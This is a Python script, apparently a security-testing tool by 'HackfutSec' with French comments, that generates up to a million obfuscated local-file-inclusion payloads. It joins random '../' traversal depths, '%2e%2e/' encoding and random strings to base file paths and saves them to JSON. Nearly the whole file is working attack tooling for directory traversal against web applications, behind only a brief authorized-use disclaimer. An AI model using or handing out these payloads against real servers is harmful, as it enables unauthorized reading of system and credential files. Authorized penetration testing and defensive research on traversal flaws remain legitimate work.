import json
import random
import string
import os
import sys
import os
import sys
import time

if os.name == "nt":  # Check if the OS is Windows
    os.system("cls")  # Clear the screen for Windows OS
else:
    os.system("clear")  # Clear the screen for Unix-like OS

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLEU = '\033[34m'

banner = {'''
          
          #Author  : Hackfut
          #Contact : t.me/HackfutSec
          #Github  : https://github.com/HackfutSec
          #License : MIT  
          _________                                   __ __________        .__   
          \_   ___ \  ____   _______  __ ____________/  |\______   \___.__.|  |  
           /    \  \/ /  _ \ /    \  \/ // __ \_  __ \   __\     ___<   |  ||  |  
           \     \___(  <_> )   |  \   /\  ___/|  | \/|  | |    |    \___  ||  |__
            \______  /\____/|___|  /\_/  \___  >__|   |__| |____|    / ____||____/
                   \/            \/          \/                      \/           
          
          DESCRIPTION TOOL: 
          This program generates payloads for testing web application vulnerabilities. 
          It loads base payloads from a JSON, TXT, or PY file, and then creates obfuscated 
          variations with random depths and additional strings. The generated payloads are saved into a JSON file for further use.
           Users can customize the maximum depth of paths and the number of payloads to generate. 
          It is intended for security testing and should only be used in authorized environments.

'''}

for  col in banner:
    print(bcolors.BLEU + col, end="")
    sys.stdout.flush()
    time.sleep(0.00005)

def generate_random_string(length=6):
    """Génère une chaîne de caractères aléatoires (utilisée pour l'obfuscation)."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def load_base_payloads(input_file):
    """Charge les payloads de base depuis un fichier JSON ou un fichier texte."""
    try:
        if not os.path.isfile(input_file):
            print(bcolors.YELLOW + f"\n[] Erreur : Le fichier {input_file} n'existe pas.")
            return []
        
        # Si le fichier est un JSON
        if input_file.endswith('.json'):
            with open(input_file, 'r', encoding='utf-8') as f:
                try:
                    payloads = json.load(f)
                    if not isinstance(payloads, list):
                        print(bcolors.RED + f"\n[] Erreur : Le fichier {input_file} ne contient pas une liste de payloads.")
                        return []
                    return payloads
                except json.JSONDecodeError as e:
                    print(bcolors.RED + f"\n[]Erreur : Le fichier {input_file} n'est pas un fichier JSON valide. Détails : {e}")
                    return []
        
        # Si le fichier est un texte (txt, py, etc.)
        elif input_file.endswith('.txt') or input_file.endswith('.py'):
            with open(input_file, 'r', encoding='utf-8') as f:
                payloads = f.read().splitlines()
                return payloads

        else:
            print(bcolors.RED + f"\n[] Erreur : Le fichier {input_file} n'a pas une extension supportée (JSON, TXT ou PY).")
            return []
    
    except Exception as e:
        print(f"\n[] Erreur lors du traitement du fichier {input_file}: {e}")
        return []

def generate_lfi_payload(depth_max=10, base_payloads=None, output_file='payloads.json', count=1000000):
    """Génère un fichier JSON contenant des payloads LFI à partir d'un fichier de base."""
    if base_payloads is None or len(base_payloads) == 0:
        print(bcolors.RED + "\n[] Aucun payload de base disponible pour générer des variantes.")
        return

    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            payloads = set()  # Utilisation d'un set pour éviter les doublons
            for _ in range(count):
                # Variation aléatoire de la profondeur
                depth = "../" * random.randint(1, depth_max)
                
                # Variation de l'obfuscation
                obfuscation = "%2e%2e/" if random.random() < 0.3 else ""
                
                # Ajouter une obfuscation supplémentaire aléatoire pour diversifier les payloads
                random_obfuscation = generate_random_string() if random.random() < 0.2 else ""
                
                # Suffixe choisi parmi la liste des payloads de base
                suffix = base_payloads[random.randint(0, len(base_payloads)-1)]
                
                # Construire le payload
                payload = f"{depth}{obfuscation}{random_obfuscation}{suffix}"
                payloads.add(payload)
            
            # Sauvegarder les payloads dans le fichier en format JSON
            json.dump(list(payloads), f, indent=2)
        
        print(bcolors.GREEN + f"\n[+] {len(payloads)} payloads générés et sauvegardés dans {output_file}")
    
    except Exception as e:
        print(f"\n[] Erreur lors de la génération des payloads ou de la sauvegarde dans {output_file}: {e}")

# Exemple d'utilisation :
input_file = input(bcolors.BLEU + "\n[] Entrez le nom du fichier d'entrée (ex: payloads.json, input.txt, script.py) : ").strip()  # Le fichier d'entrée
output_file = 'payloads.json'  # Le fichier de sortie au format JSON

# Charger les payloads de base depuis le fichier d'entrée
base_payloads = load_base_payloads(input_file)

# Appel de la fonction pour générer les nouveaux payloads
generate_lfi_payload(depth_max=15, base_payloads=base_payloads, output_file=output_file, count=1000000)
